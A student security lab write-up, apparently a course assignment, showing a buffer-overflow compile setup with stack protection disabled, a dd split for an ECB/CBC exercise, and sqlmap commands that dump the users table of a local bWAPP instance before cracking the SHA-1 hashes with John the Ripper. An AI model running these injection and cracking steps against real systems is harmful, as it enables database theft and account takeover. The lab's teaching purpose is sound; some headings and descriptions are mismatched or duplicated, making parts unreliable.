# Lab #1,22110013, Nguyen Le Tung Chi, 1INSE330380E_03FIE
# Task 1: Software buffer overflow attack
This lab explores various encryption algorithm with openssl
**Question 1**: Compile both C programs and shellcode to executable code
**Answer 1**:
### 1. Create a file vulnerable C program and Shellcode :
*Vulnerable*<br>

<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/088de4be-0b99-45dd-88b9-445ecf3d4721"><br>
*Shellcode*<br>
<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/836fd022-f44f-4aec-82fc-e02a6c911fbc"><br>

### 2. Use a docker container to do. It will be mapped to my Seclabs directoy:
 ![image](https://github.com/user-attachments/assets/ffd49dd3-deb0-4410-a96d-27fdde477641)

compile the C program by `gcc`
```sh
gcc -g vul.c -o vul.out -fno-stack-protector -mpreferred-stack-boundary=2
``` 
compile the C program by `gcc`
```sh
gcc -g vul.c -o vul.out -fno-stack-protector -mpreferred-stack-boundary=2
``` 

# Task 2. Encryption Mode – ECB vs. CBC
This lab compares the behaviour of ECB and CBC encryption modes
**Question 1**: Exploration of various ECB & CBC  with openssl
**Answer 1**:
## 1. Download the bitmap file `origin.bmp`.


## 2. Split the file into header and body:

```sh
dd if=origin.bmp of=header.bin bs=1 count=54
dd if=origin.bmp of=body.bin bs=1 skip=54
```

<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage7.png?raw=true"><br>



# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security).
![image](https://github.com/user-attachments/assets/53a1510d-4940-4e0a-bab4-2d27d811b85c)
![image](https://github.com/user-attachments/assets/e131a065-520a-4a54-96b1-b67d70cb2bad)

- Install sqlmap.
![image](https://github.com/user-attachments/assets/a0e285f8-c6b6-4b7e-aa44-6cdbfd540a0a)

- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases

**Answer 1**: A vulnerable URL in bWAPP
`http://localhost:8025/portal.php`
Choose SQL Injection (GET/Select) to get information
![image](https://github.com/user-attachments/assets/73fc436a-fcc6-4ec4-a120-6a73ddbbe6fa)
**Open Command Line and use the command**
```sh
py sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=ssu5d6m0ng7ugh7cvav36l03g1; security_level=0;" --dbs

```
**The cookie address will get in bWAP:**

![image](https://github.com/user-attachments/assets/2118bae7-7b56-4f12-86c4-e68a92b95ad9)
**So we have the result:**

![image](https://github.com/user-attachments/assets/89e96f03-ba13-49c3-8ba4-dd1cef4f7fd7)
**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
**Use this command to get tables:**

```sh
py sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=ssu5d6m0ng7ugh7cvav36l03g1; security_level=0;" -D bWAPP --tables

```

**We have 5 bytes**
![image](https://github.com/user-attachments/assets/0e79bb9e-52b2-4343-aacd-86a20cd0775d)

**Use this command to get users information: **

```sh
py sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=ssu5d6m0ng7ugh7cvav36l03g1; security_level=0;" -D bWAPP -T users --dump

```

we have 
*Database: bWAPP*
Table: users
[2 entries]

![image](https://github.com/user-attachments/assets/844bbbc5-d5e1-4ab7-bf4b-85fad528bab4)

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit

**Answer 3**:

*1. Access the link `https://www.openwall.com/john/`*
*2. Download this **Openwall***
3. 
![image](https://github.com/user-attachments/assets/558b15a3-72cc-4ec3-9051-d48f99a1009a)

*4. Create a file `hashes.txt` in the folder name `run`*
   
![image](https://github.com/user-attachments/assets/0be0e872-31bf-46ad-bfb8-3f4a3afae9c0)

Then, we save with this content: 

`A.I.M.:6885858486f31043e5839c735d99457f045affd0
bee:6885858486f31043e5839c735d99457f045affd0`

*5. Open **Command Line** in folder `run`:*
Use the command: `john --test`

![image](https://github.com/user-attachments/assets/9ad46afc-5328-4869-b5d6-11bc64b5d49d)

Following this command we use: `john hashes.txt`

![image](https://github.com/user-attachments/assets/b162bba5-d9e3-4053-b701-b9d8ce75e85d)

**Then we get the username and password**

   -> result
   ![image](https://github.com/user-attachments/assets/77e81f6e-38bf-465a-a88e-ec2dc7b9e191)
